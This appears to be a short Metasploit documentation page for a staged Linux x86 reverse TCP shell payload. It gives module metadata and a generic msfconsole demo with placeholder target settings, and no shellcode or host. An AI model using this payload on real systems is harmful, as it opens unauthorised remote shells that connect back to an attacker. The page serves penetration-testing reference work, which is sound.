## Linux Command Shell, Reverse TCP Stager

Spawn a command shell (staged). Connect back to the attacker


## Module Name
payload/linux/x86/shell/reverse_nonx_tcp

## Authors
* skape





## Platforms
* linux

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/linux/x86/shell/reverse_nonx_tcp
msf payload(reverse_nonx_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_nonx_tcp) > set TARGET <target-id>
msf payload(reverse_nonx_tcp) > show options
   ... show and set options ...
msf payload(reverse_nonx_tcp) > run
```
    
    